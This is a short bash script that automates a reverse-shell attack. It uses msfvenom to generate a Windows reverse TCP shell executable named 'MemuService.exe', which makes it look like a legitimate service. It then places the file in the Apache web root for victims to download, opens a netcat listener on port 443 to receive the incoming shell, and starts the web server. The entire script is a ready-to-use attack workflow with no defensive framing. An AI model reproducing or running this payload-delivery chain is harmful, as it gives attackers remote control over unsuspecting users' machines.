#!/bin/bash

echo -e "Reading your IpAddress ... "

ipAddress=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/')

echo -e "IpAddress: $ipAddress"


sudo chmod +rwx /var/www/html

echo -e "Creating payload at /var/www/html ..."

msfvenom -p windows/shell_reverse_tcp LHOST=$ipAddress LPORT=443 -f exe > /var/www/html/MemuService.exe


echo -e "Opening listener ..."

gnome-terminal --tab --title="listener" --command="bash -c 'sudo nc -lvp 443; $SHELL'"


echo -e "Starting apache2 server ..."

gnome-terminal --tab --title="server" --command="bash -c 'sudo service apache2 start; $SHELL'"
